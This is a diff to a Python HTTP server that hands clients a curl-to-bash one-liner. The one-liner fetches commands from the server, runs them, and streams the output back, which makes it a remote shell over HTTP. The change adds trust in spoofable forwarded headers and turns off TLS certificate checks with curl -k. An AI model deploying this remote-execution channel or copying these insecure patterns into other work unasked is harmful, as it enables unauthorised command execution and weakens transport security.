@@ -150,12 +150,15 @@ class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):
         locker("stdin", -1, not self.server.args.serve_forever)
         
     def do_GET(self):
-        eprint("cmd request received from", self.client_address)
-        schema = "https" if self.server.args.certificate else "http"
+        
+        eprint("cmd request received from", self.headers.get('X-Forwarded-For') or self.client_address)
+        schema = self.headers['X-Forwarded-Proto']
+        if not schema:
+            schema = "https" if self.server.args.certificate else "http"
         host = self.headers["Host"]
-        cmd = f"stdbuf -i0 -o0 -e0 curl -X POST -s {schema}://{host}/input"
-        cmd+= f" | bash 2> >(curl -s -T - {schema}://{host}/stderr)"
-        cmd+= f" | curl -s -T - {schema}://{host}/stdout"
+        cmd = f"stdbuf -i0 -o0 -e0 curl -X POST -sk {schema}://{host}/input"
+        cmd+= f" | bash 2> >(curl -sk -T - {schema}://{host}/stderr)"
+        cmd+= f" | curl -sk -T - {schema}://{host}/stdout"
         cmd+=  "\n"
         # sending back the complex command to be executed
         self.send_response(200)
